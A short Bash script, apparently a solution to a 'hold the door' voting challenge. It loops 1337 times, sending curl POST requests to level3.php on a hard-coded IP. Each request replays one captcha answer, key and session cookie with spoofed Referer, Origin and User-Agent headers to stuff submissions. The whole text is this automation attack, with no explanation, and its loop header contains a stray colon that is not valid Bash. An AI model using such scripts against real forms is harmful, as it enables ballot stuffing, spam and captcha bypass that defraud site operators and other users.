for i in $(seq 1 1337):
do
	curl '173.246.108.142/level3.php' --data 'id=1337&key=d943009fdd0a4c64a83873a48775c914cd2f7346&captcha=5fcc&holdthedoor=Submit' -H 'Cookie: PHPSESSID=etihnfto094jshp8gr0rsn4bt5; HoldTheDoor=d943009fdd0a4c64a83873a48775c914cd2f7346' -H 'Referer: http://173.246.108.142/level3.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/10.0.1' -H 'Origin: http://173.246.108.142'  --compressed
done
